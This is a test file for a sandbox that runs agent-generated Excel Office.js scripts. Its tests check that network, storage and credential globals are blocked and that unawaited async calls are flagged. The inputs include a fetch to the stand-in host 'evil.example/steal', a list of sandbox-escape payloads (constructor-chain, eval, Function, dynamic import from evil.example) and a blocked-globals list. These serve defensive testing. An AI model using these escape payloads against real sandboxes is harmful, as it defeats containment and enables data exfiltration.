import { describe, expect, it } from "vitest";
import {
  buildScriptFunction,
  findSandboxEscapes,
  findUnawaitedAsyncCalls,
  SCRIPT_BLOCKED_GLOBALS,
} from "./run-script-sandbox";

// Fakes for the two legitimate params generated code is allowed to touch.
const fakeCtx = { marker: "ctx" };
const fakeExcel = { ChartType: { columnClustered: "col" } };

describe("buildScriptFunction sandbox", () => {
  it("exposes ctx and Excel to the script", async () => {
    const fn = buildScriptFunction("return { c: ctx.marker, e: Excel.ChartType.columnClustered };");
    const out = await fn(fakeCtx, fakeExcel);
    expect(out).toEqual({ c: "ctx", e: "col" });
  });

  it("shadows network globals to undefined", async () => {
    for (const g of ["fetch", "XMLHttpRequest", "WebSocket", "navigator"]) {
      const fn = buildScriptFunction(`return typeof ${g};`);
      expect(await fn(fakeCtx, fakeExcel)).toBe("undefined");
    }
  });

  it("shadows storage + host-credential globals to undefined", async () => {
    for (const g of ["localStorage", "indexedDB", "OfficeRuntime", "Office", "sessionStorage"]) {
      const fn = buildScriptFunction(`return typeof ${g};`);
      expect(await fn(fakeCtx, fakeExcel)).toBe("undefined");
    }
  });

  it("shadows window / document to undefined", async () => {
    for (const g of ["window", "document", "self", "globalThis", "location"]) {
      const fn = buildScriptFunction(`return typeof ${g};`);
      expect(await fn(fakeCtx, fakeExcel)).toBe("undefined");
    }
  });

  it("a script that tries to fetch throws rather than exfiltrating", async () => {
    const fn = buildScriptFunction(`return await fetch("https://evil.example/steal");`);
    // fetch is undefined → calling it throws TypeError, surfaced to the
    // run_excel_script error path (the agent sees { ok:false, error }).
    await expect(fn(fakeCtx, fakeExcel)).rejects.toThrow();
  });

  it("leaves ordinary JS built-ins available (not over-shadowed)", async () => {
    const fn = buildScriptFunction(
      "return [typeof JSON, typeof Math, typeof Promise, typeof Array, typeof Object, typeof Date];"
    );
    expect(await fn(fakeCtx, fakeExcel)).toEqual([
      "object", // JSON
      "object", // Math
      "function", // Promise
      "function", // Array
      "function", // Object
      "function", // Date
    ]);
  });

  it("blocked-globals list covers the key escalation vectors", () => {
    for (const g of ["fetch", "localStorage", "indexedDB", "OfficeRuntime", "document"]) {
      expect(SCRIPT_BLOCKED_GLOBALS as readonly string[]).toContain(g);
    }
  });
});

describe("findSandboxEscapes", () => {
  // Each of these was verified to reach the real global scope through the
  // shadowing-only sandbox.
  it.each([
    ['({}).constructor.constructor("return fetch")()', "constructor chain"],
    ['[].constructor.constructor("return fetch")()', "constructor chain, array"],
    ['Object.constructor("return fetch")()', "built-in constructor"],
    ['Function("return fetch")()', "bare Function"],
    ['new Function("return fetch")()', "new Function"],
    ['eval("fetch")', "eval"],
    ['await import("https://evil.example/m.js")', "dynamic import"],
    ['importScripts("https://evil.example/m.js")', "importScripts"],
  ])("refuses %s", (code) => {
    expect(findSandboxEscapes(code).length).toBeGreaterThan(0);
    expect(() => buildScriptFunction(code)).toThrow(/Refusing to run this script/);
  });

  it("allows ordinary Office.js that merely mentions similar words", () => {
    const legit = `
      const sheet = ctx.workbook.worksheets.getActiveWorksheet();
      const range = sheet.getRange("A1:B2");
      range.load("values");
      await ctx.sync();
      const constructorNote = "built by the constructor team";
      return { values: range.values, constructorNote };
    `;
    expect(findSandboxEscapes(legit)).toEqual([]);
    expect(() => buildScriptFunction(legit)).not.toThrow();
  });

  it("shadows Function so even an unmatched reference cannot reach the global", async () => {
    // Belt and braces: the static scan is a denylist, so the shadow must
    // still hold for anything that slips past it.
    const fn = buildScriptFunction("return typeof globalThis;");
    expect(await fn(null, null)).toBe("undefined");
  });
});

describe("findUnawaitedAsyncCalls", () => {
  const flagged = (code: string): string[] => findUnawaitedAsyncCalls(code);

  it("flags the fire-and-forget shape that caused the 2026-09-04 silent data loss", () => {
    expect(
      flagged(`
        async function main() {
          ctx.workbook.worksheets.add("RR Analysis");
          await ctx.sync();
        }
        main();
      `)
    ).toEqual(["main"]);
  });

  it("flags void-prefixed and .catch-chained calls (still not awaited)", () => {
    expect(flagged(`async function run(){ await ctx.sync(); }\nvoid run();`)).toEqual(["run"]);
    expect(flagged(`async function run(){ await ctx.sync(); }\nrun().catch(e => e);`)).toEqual([
      "run",
    ]);
  });

  it("flags async arrow functions assigned to a const", () => {
    expect(flagged(`const build = async () => { await ctx.sync(); };\nbuild();`)).toEqual([
      "build",
    ]);
  });

  it("accepts awaited and returned calls", () => {
    expect(flagged(`async function main(){ await ctx.sync(); }\nawait main();`)).toEqual([]);
    expect(flagged(`async function main(){ await ctx.sync(); }\nreturn main();`)).toEqual([]);
    expect(flagged(`const f = async () => 1;\nconst v = await f();\nreturn v;`)).toEqual([]);
  });

  it("accepts top-level await with no helper function at all", () => {
    expect(
      flagged(`
        const sheet = ctx.workbook.worksheets.add("RR Analysis");
        sheet.getRange("A1").values = [["hi"]];
        await ctx.sync();
        return { created: true };
      `)
    ).toEqual([]);
  });

  it("does not flag non-async helpers", () => {
    expect(flagged(`function label(u){ return u.name; }\nlabel(unit);\nawait ctx.sync();`)).toEqual(
      []
    );
  });

  it("does not trip on a call-like token inside a formula string", () => {
    expect(
      flagged(`
        async function main(){ await ctx.sync(); }
        const f = "=IF(main(A1)>0, main(B1), 0)";
        sheet.getRange("A1").formulas = [[f]];
        return main();
      `)
    ).toEqual([]);
  });

  it("does not trip on a call-like token inside a comment", () => {
    expect(
      flagged(`
        async function main(){ await ctx.sync(); }
        // call main(); later — this is prose, not code
        return main();
      `)
    ).toEqual([]);
  });

  it("does not flag a method call that shares the name", () => {
    expect(
      flagged(`async function sync(){ await ctx.sync(); }\nawait ctx.sync();\nreturn sync();`)
    ).toEqual([]);
  });

  it("accepts a promise composed into Promise.all", () => {
    expect(
      flagged(`const a = async () => 1;\nconst b = async () => 2;\nreturn Promise.all([a(), b()]);`)
    ).toEqual([]);
  });
});
